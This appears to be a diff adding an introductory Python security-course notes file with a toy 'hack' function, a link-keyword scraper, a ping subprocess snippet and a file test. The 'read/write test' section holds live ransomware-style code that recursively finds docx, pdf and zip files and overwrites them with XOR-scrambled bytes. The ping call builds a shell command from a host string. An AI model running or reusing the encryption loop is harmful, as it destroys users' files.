@@ -1,0 +1,159 @@
+
+targeting:
+	#!/usr/bin/env python3
+	import random
+	import urllib.request
+
+	req = urllib.request.urlopen('https://shyft.us')
+
+	data = req.read()
+	print(data)
+
+	exit()
+	def hack(target_to_hack):
+		successful_hack = False
+		print(f"begin hacking {target_to_hack} ")
+		rand_num = random.randint(0,10)
+		if rand_num > 5:
+			successful_hack = True
+		else:
+			successful_hack = False
+		if successful_hack:
+			print('hack was successful')
+
+		print("end hacking")
+
+		return successful_hack
+
+	# targets = [
+	#     "10.0.0.2",
+	#     "10.0.0.3", 
+	#     "10.0.0.34",
+	# ]
+
+	# for target in targets:
+	#     print(f'targeting {target}')
+	#     was_successful = hack()
+	#     if was_successful:
+	#         print('hack was successful')
+
+	target = input("What server do you want to hack? ")
+	# print(f'targeting {target}')
+	hack(target)
+
+web_request:
+	#!/usr/bin/env python3
+	from requests_html import HTMLSession
+	session = HTMLSession()
+
+	r = session.get('https://python.org/')
+	#import urllib.request
+	# import requests
+
+	# req = urllib.request.urlopen('https://shyft.us')
+	# req = requests.get('https://arvest.com')
+
+	data = r.text
+	# data = req.read().decode()
+	# if 'healthcare' in data:
+	#     print('keyword health found..')
+	# if 'banking' in data.lower():
+	#     print('keyword banking found')    
+	print(r.status_code,r.html.absolute_links)
+	data2 = r.html.absolute_links
+	count = 0
+	var_list = ['banking', 'healthcare', 'about', 'hacker', 'gibson', 'eli', 'web', 'hack', 'news']
+
+	for term in var_list:
+		# if term in data.lower():
+		for site in data2:
+			if term in site:
+				count = count +1
+				print(f"{term} @ {site}")
+			# else:
+			#     print(f"{term} not found...")            
+		# if term in data2:    
+		#     count = count +1
+		#     print(f"{term} keyword found...")
+		# else:
+		#     print(f"{term} not found...")    
+	print(f"counted {count} found items")        
+
+
+
+	# print(data)
+
+
+read/write test:
+	#!/usr/bin/env python3
+	import os
+
+	# create a file
+	with open("a_file.txt", 'w') as new_file:
+		new_file.write("This is not the greates code in the world \r\nthis is just a tribute\r\n")
+
+	new_file = open("b_file.txt", 'w')
+	new_file.write("*guitar solo*\n")
+	new_file.close()
+
+	#open a file
+	# lines = open('a_file.txt').readlines()    
+	# for line in lines:
+	#     print(line.strip())
+
+	# lines = open('keywords.txt').read().splitlines(keepends=False)  
+	# for line in lines:
+	#         print(line)
+
+	# delete a file
+	# os.remove('a_file.txt')
+
+	#encrypt the file using single byte XOR operation
+	# with open('b_file.txt', 'r+b') as input_file:
+	#     raw_data = input_file.read()
+	#     input_file.seek(0)
+	#     for char in raw_data:
+	#         enc_byte =chr(char ^ 0x13) #singlebyte value xor base 10 19
+	#         input_file.write(enc_byte.encode())
+		
+	def encrypt(target_file):
+		with open(target_file, 'r+b') as input_file:
+			raw_data = input_file.read()
+			input_file.seek(0)
+			for char in raw_data:
+				enc_byte =chr(char ^ 0x13) #singlebyte value xor base 10 19
+				input_file.write(enc_byte.encode())
+
+	target_file_types = ['docx', 'pdf', 'zip']
+	target_files = []
+	import glob
+
+	for file_type in target_file_types:
+		# find files that  end in file types
+		interesting_files = glob.glob(f"**/*{file_type}", recursive=True)
+		target_files.extend(interesting_files)
+
+	print(target_files)
+	for tf in target_files:
+		encrypt(tf)
+	# encrypt(target_file)        
+
+shell type: / Subprocess
+
+	import readline
+	import os
+	import subprocess
+
+	target = "10.0.0.100" #input("host: ")
+	# os.system(f"ping -c 1 {target}")
+	cmd = f"ping -c 1 {target}"
+	# add -p to add padding chars to ping request.
+	ping_output = subprocess.run(cmd, shell=True, capture_output=True)
+	print(ping_output.stdout.decode())
+
+
+
+
+
+
+
